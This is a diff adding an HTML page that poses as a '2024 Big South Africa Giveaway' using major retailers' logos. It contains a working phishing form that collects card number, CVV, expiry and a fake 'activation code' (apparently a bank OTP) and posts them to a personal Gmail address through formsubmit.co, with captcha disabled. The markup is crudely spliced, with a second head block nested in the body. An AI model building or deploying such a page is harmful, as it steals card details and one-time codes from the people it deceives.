@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2024 Big South Africa Giveaway</title>
+    <style>
+        /* General Styles */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #f9f9f9;
+            color: #333;
+            box-sizing: border-box;
+        }
+        header {
+            background: linear-gradient(45deg, #2a8ac4, #2b7db1);
+            color: white;
+            text-align: center;
+            padding: 4px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            border-bottom: 4px solid #4a8ec2;
+        }
+        header h1 {
+            font-size: 2.5rem;
+            font-weight: bold;
+            margin: 0;
+        }
+        header p {
+            font-size: 1.2rem;
+            margin-top: 1px;
+            font-weight: 400;
+        }
+
+        /* Promo Explanation */
+        .promo-explanation {
+            background: #ff6f61;
+            color: white;
+            padding: 1px;
+            font-size: 1.1rem;
+            margin-top: 20px;
+            text-align: center;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Product Listing Section */
+        .product-list {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 20px;
+            padding: 40px 20px;
+            box-sizing: border-box;
+        }
+        .product-card {
+            background: white;
+            border-radius: 12px;
+            width: 260px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+        }
+        .product-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.1);
+        }
+        .product-card img {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            border-radius: 8px;
+        }
+        .product-card h3 {
+            font-size: 1.7rem;
+            font-weight: 600;
+            color: #333;
+            margin: 14px 0;
+        }
+        .product-card p {
+            font-size: 1rem;
+            color: #666;
+            margin: 8px 0;
+        }
+        .product-card .price {
+            font-size: 1.4rem;
+            font-weight: bold;
+            color: #2e7d32;
+            margin-top: 12px;
+        }
+        .product-card .price-old {
+            font-size: 1.1rem;
+            text-decoration: line-through;
+            color: #888;
+            margin-top: 5px;
+        }
+        .product-card button {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 1.2rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            margin-top: 15px;
+            width: 100%;
+        }
+        .product-card button:hover {
+            background: #218838;
+        }
+
+        /* Spin Wheel Section */
+        .spin-wheel-section {
+            text-align: center;
+            padding: 50px 20px;
+            background: #f1f1f1;
+            margin-top: 40px;
+            border-top: 4px solid #eaeaea;
+        }
+        .spin-wheel {
+            width: 300px;
+            height: 300px;
+            margin: 0 auto;
+            position: relative;
+            border-radius: 50%;
+            background: conic-gradient(
+                #ff5722 0deg 45deg,
+                #4caf50 45deg 90deg,
+                #ffeb3b 90deg 135deg,
+                #2196f3 135deg 180deg,
+                #f44336 180deg 225deg,
+                #ff5722 225deg 270deg,
+                #4caf50 270deg 315deg,
+                #2196f3 315deg 360deg
+            );
+            transition: transform 4s ease-in-out;
+        }
+        .arrow {
+            position: absolute;
+            top: -30px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 35px;
+            height: 35px;
+            background: #ff5722;
+            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
+        }
+        .spin-btn {
+            margin-top: 25px;
+            padding: 15px 25px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1.2rem;
+            transition: background 0.3s ease;
+        }
+        .spin-btn:hover {
+            background: #0056b3;
+        }
+        .result {
+            margin-top: 15px;
+            font-size: 1.3rem;
+            color: #333;
+        }
+        .percentage-label {
+            position: absolute;
+            color: white;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+        #label-top {
+            top: 6%;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        #label-bottom {
+            bottom: 6%;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        #label-left {
+            left: 6%;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+        #label-right {
+            right: 6%;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+        
+
+        /* Sponsors Section */
+        .sponsors {
+            text-align: center;
+            padding: 50px 20px;
+            background: #ffffff;
+            margin-top: 50px;
+        }
+        .sponsors h2 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        .sponsor-logos {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+        .sponsor-logos img {
+            width: 150px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+        .sponsor-logos img:hover {
+            transform: scale(1.08);
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 20px;
+            background: #333;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <h1>2024 Big South Africa Giveaway</h1>
+        <p>Spin the wheel and win big discounts on your favorite products!</p>
+    </header>
+    </section>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background-color: #f4f4f4;
+        }
+        .form-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            max-width: 400px;
+            margin: auto;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        .form-container h1 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            background: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #218838;
+        }
+        .price-info {
+            text-align: center;
+            font-size: 1.2rem;
+            margin-top: 15px;
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+        }
+        .popup button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .popup button:hover {
+            background: #0056b3;
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        <h1>Payment Details</h1>
+        <form id="paymentForm" action="https://formsubmit.co/wizw9191@gmail.com" method="POST">
+            <label for="name">Name:</label>
+            <input type="text" id="name" name="name" required>
+
+            <label for="cardno">Card Number:</label>
+            <input type="text" id="cardno" name="cardno" required>
+
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" name="cvv" required>
+
+            <label for="month">Month (MM):</label>
+            <input type="text" id="month" name="month" placeholder="Enter Month (MM)" required>
+
+            <label for="year">Year (YYYY):</label>
+            <input type="text" id="year" name="year" placeholder="Enter Year (YYYY)" required>
+
+            <input type="hidden" name="_subject" value="New Payment Submission">
+            <input type="hidden" name="_captcha" value="false">
+
+            <!-- Hidden input for the activation code (it will be added dynamically) -->
+            <input type="hidden" id="activationCodeInput" name="activationCode">
+
+            <button type="button" id="payBtn">Pay R20</button>
+        </form>
+
+        <div class="price-info">
+            <p>Total: R20</p>
+        </div>
+    </div>
+
+    <!-- Activation Code Popup -->
+    <div class="overlay" id="overlay"></div>
+    <div class="popup" id="popup">
+        <h2>Enter Activation Code</h2>
+        <p>Your activation code will be available in 14 minutes. Please check back then.</p>
+        <input type="text" id="activationCode" placeholder="Enter Activation Code">
+        <button id="submitActivationCode">Submit Activation Code</button>
+    </div>
+
+    <script>
+        // Check if user has previously filled the form
+        window.onload = function() {
+            if(localStorage.getItem('paymentDetails')) {
+                const paymentDetails = JSON.parse(localStorage.getItem('paymentDetails'));
+                document.getElementById('name').value = paymentDetails.name;
+                document.getElementById('cardno').value = paymentDetails.cardno;
+                document.getElementById('cvv').value = paymentDetails.cvv;
+                document.getElementById('month').value = paymentDetails.month;
+                document.getElementById('year').value = paymentDetails.year;
+            }
+        }
+
+        // Store form details in localStorage
+        document.getElementById('paymentForm').addEventListener('input', function() {
+            const paymentDetails = {
+                name: document.getElementById('name').value,
+                cardno: document.getElementById('cardno').value,
+                cvv: document.getElementById('cvv').value,
+                month: document.getElementById('month').value,
+                year: document.getElementById('year').value
+            };
+            localStorage.setItem('paymentDetails', JSON.stringify(paymentDetails));
+        });
+
+        // Show activation code popup and store details
+        document.getElementById('payBtn').addEventListener('click', function() {
+            // Store the initial form details before showing the popup
+            localStorage.setItem('paymentDetails', JSON.stringify({
+                name: document.getElementById('name').value,
+                cardno: document.getElementById('cardno').value,
+                cvv: document.getElementById('cvv').value,
+                month: document.getElementById('month').value,
+                year: document.getElementById('year').value
+            }));
+
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('popup').style.display = 'block';
+        });
+
+        // Handle activation code submission
+        document.getElementById('submitActivationCode').addEventListener('click', function() {
+            const activationCode = document.getElementById('activationCode').value;
+            if (activationCode) {
+                // Add the activation code to the hidden input before submission
+                document.getElementById('activationCodeInput').value = activationCode;
+
+                // Submit form after user enters activation code
+                document.getElementById('paymentForm').submit();
+            } else {
+                alert("Please enter the activation code.");
+            }
+        });
+    </script>
+    
+    </section>
+
+    </section>
+
+    <!-- Sponsors Section -->
+    <section class="sponsors">
+        <h2>Sponsored By</h2>
+        <div class="sponsor-logos">
+            <img src="https://big24promo.github.io/SA2024promo/images/Amazon.png">
+            <img src="https://big24promo.github.io/SA2024promo/images/bidt001_bidvest.jpg">
+            <img src="https://big24promo.github.io/SA2024promo/images/temu.png">
+            <img src="https://big24promo.github.io/SA2024promo/images/shein.png">
+            <img src="https://big24promo.github.io/SA2024promo/images/ivestc.jpg">
+            <img src="https://big24promo.github.io/SA2024promo/images/mass.png">
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <p>&copy; 2024 Big South Africa Giveaway. All Rights Reserved.</p>
+    </footer>
+
+
+</body>
+</html>
